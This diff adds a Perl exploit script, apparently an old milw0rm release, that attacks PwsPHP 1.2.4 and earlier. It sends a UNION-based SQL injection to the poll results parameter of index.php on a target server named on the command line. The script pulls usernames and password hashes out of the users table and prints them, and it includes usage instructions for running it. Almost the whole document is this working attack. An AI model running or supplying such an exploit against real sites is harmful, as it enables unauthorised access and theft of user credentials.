@@ -1,0 +1,46 @@
+#!/usr/bin/perl
+#
+# PwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit
+# http://example.com/index.php?mod=sondages&do=results&id=1%20union%20select%20id,0,0,pseudo,pass,pseudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20%60users%60%20/*
+# Discovered by: papipsycho (papipsycho.com) (WOrlddefacers.de)
+# ported by str0ke (milw0rm.com)
+
+use LWP::Simple;
+
+$serv     =  $ARGV[0];
+$path     =  $ARGV[1];
+
+sub usage
+ {
+    print "\nPwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit\n";
+    print "Discovered by: papipsycho (papipsycho.com)\n";
+    print "Ported by str0ke (milw0rm.com)\n";
+    print "Usage: $0 www.example.com /directory/\n";
+    print "sever    -  URL\n";
+    print "path     -  path to index.php\n";
+    exit ();
+}
+
+sub exploit
+ {
+    print qq(
+    PwsPHP <= 1.2.4 (index.php) Remote SQL Injection Exploit
+    Discovered by: papipsycho (papipsycho.com)
+    Ported by str0ke (milw0rm.com)\n\n);
+
+    $string= "index.php?mod=sondages&do=results&id=1%20union%20select%20id,0,0,pseudo,pass,pseudo,0,0,0,0,0,0,0,0,0,0,0,0,0,0%20from%20%60users%60%20/*";
+    $url = sprintf("http://%s%s%s",$serv,$path,$string);
+    $content = get "$url";
+    @contents = split(/\n/, $content);
+    foreach $line (@contents) {
+    if ($line =~ /(\<center\>\<b\>)(.*?)(\<\/b\>\<\/center\>\<br\>\<br\>)/){&username;}
+    if ($line =~ /(\<td\>)(\w{32})(\<\/td\>)/){&password;}
+    }
+}
+
+sub username { print "[*] Username: $2\n";}
+sub password { print "[*] Hash: $2\n\n";}
+
+if (@ARGV != 2){&usage;}else{&exploit;}
+
+# milw0rm.com [2006-02-25]
